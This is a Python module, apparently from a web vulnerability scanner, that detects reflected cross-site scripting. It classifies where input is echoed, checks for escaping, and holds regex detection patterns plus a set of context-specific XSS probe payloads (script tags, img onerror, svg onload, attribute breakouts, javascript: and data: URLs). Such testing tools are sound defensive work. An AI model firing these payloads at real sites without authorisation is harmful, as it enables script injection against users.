import re
from html import escape

# Extended markers to detect various XSS patterns
XSS_MARKERS = [
    "xss_probe_1",
    "xss_probe_2",
    "xss_probe_3",
]

# Dangerous patterns that indicate potential XSS
XSS_DANGEROUS_PATTERNS = [
    r"<script[^>]*>",
    r"javascript:",
    r"on\w+\s*=",
    r"<img[^>]+onerror",
    r"<svg[^>]+onload",
    r"<iframe",
    r"<embed",
    r"<object",
    r"expression\s*\(",
    r"vbscript:",
]

def analyze_reflection(response_text, payload=None):
    """
    Analyze where and how input is reflected.
    Returns context and confidence.
    """
    findings = []

    # Check for our markers
    for marker in XSS_MARKERS:
        if marker in response_text:
            context = detect_context(response_text, marker)
            findings.append({
                "marker": marker,
                "context": context,
                "escaped": is_marker_escaped(response_text, marker)
            })

    # Also check if the actual payload is reflected (if provided)
    if payload and payload in response_text:
        context = detect_context(response_text, payload)
        findings.append({
            "marker": payload,
            "context": context,
            "escaped": False  # Raw payload found = not escaped
        })

    # Check for dangerous patterns in response
    for pattern in XSS_DANGEROUS_PATTERNS:
        if re.search(pattern, response_text, re.I):
            findings.append({
                "marker": pattern,
                "context": "dangerous_pattern",
                "escaped": False
            })

    return findings

def detect_context(response_text, marker):
    """
    Determine the HTML context where the marker appears.
    """
    # Check if inside a script tag
    script_pattern = rf"<script[^>]*>.*?{re.escape(marker)}.*?</script>"
    if re.search(script_pattern, response_text, re.I | re.S):
        return "javascript"

    # Check if inside an HTML tag as attribute value
    attr_pattern = rf'["\'][^"\']*{re.escape(marker)}[^"\']*["\']'
    if re.search(attr_pattern, response_text):
        return "attribute"

    # Check if inside an HTML tag
    tag_pattern = rf"<[^>]*{re.escape(marker)}[^>]*>"
    if re.search(tag_pattern, response_text):
        return "html_tag"

    # Check if in event handler
    event_pattern = rf"on\w+\s*=\s*[\"'][^\"']*{re.escape(marker)}"
    if re.search(event_pattern, response_text, re.I):
        return "event_handler"

    # Check if in URL context
    url_pattern = rf"(?:href|src|action)\s*=\s*[\"'][^\"']*{re.escape(marker)}"
    if re.search(url_pattern, response_text, re.I):
        return "url_context"

    # Default: somewhere in HTML body
    return "html_body"

def is_marker_escaped(response_text, marker):
    """
    Check if the marker appears in escaped form.
    """
    escaped_marker = escape(marker)
    
    # If the escaped version is different and appears, it's escaped
    if escaped_marker != marker and escaped_marker in response_text:
        # Check if the raw version also appears
        if marker not in response_text:
            return True
    
    return False

def is_potential_xss(findings):
    """
    Decide if reflection is likely exploitable.
    More comprehensive analysis.
    """
    if not findings:
        return False

    for f in findings:
        # High-risk contexts
        if f["context"] in ["javascript", "event_handler", "html_tag", "attribute"]:
            if not f.get("escaped", True):
                return True
        
        # Dangerous pattern detected
        if f["context"] == "dangerous_pattern":
            return True

        # URL context with javascript: potential
        if f["context"] == "url_context":
            return True

    return False

def generate_xss_payloads(context="generic"):
    """
    Generate context-aware XSS payloads.
    """
    payloads = {
        "generic": [
            'xss_probe_1"><script>alert(1)</script>',
            "xss_probe_2'><img src=x onerror=alert(1)>",
            'xss_probe_3"><svg onload=alert(1)>',
            "javascript:alert('xss_probe_1')",
            '<img src=x onerror="alert(1)">',
        ],
        "attribute": [
            '" onmouseover="alert(1)" x="',
            "' onclick='alert(1)' x='",
            '" onfocus="alert(1)" autofocus x="',
        ],
        "javascript": [
            "';alert(1)//",
            "\\';alert(1)//",
            "</script><script>alert(1)</script>",
        ],
        "url_context": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
    }
    return payloads.get(context, payloads["generic"])
